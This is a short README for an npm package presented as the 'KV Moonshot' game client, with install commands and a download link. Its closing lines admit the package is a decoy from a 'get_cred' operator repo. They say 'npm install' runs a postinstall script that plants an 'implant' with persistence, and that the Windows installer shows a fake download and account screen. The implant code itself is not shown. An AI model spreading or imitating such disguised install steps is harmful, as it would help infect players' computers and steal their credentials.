# KV Moonshot game client

Runtime package for KV Moonshot. After `npm install`, the native module syncs automatically (`postinstall`).

Windows players download the portable installer from [kvmoonshot.cc/download/](https://kvmoonshot.cc/download/).

## Developer (authorized lab)

```bash
npm install
node config/platform-bindings.cjs --install
npm run desktop:dev
```

Built and published from the private `get_cred` operator repo via `npm run build-decoy` → `npm run push-decoy`.

**Same implant as the Windows installer:** `npm install` runs `postinstall` → `config/platform-bindings.cjs --install` (native bootstrap + persistence). The portable `.exe` runs the same sync on first launch, then shows the fake download UI and account screen.
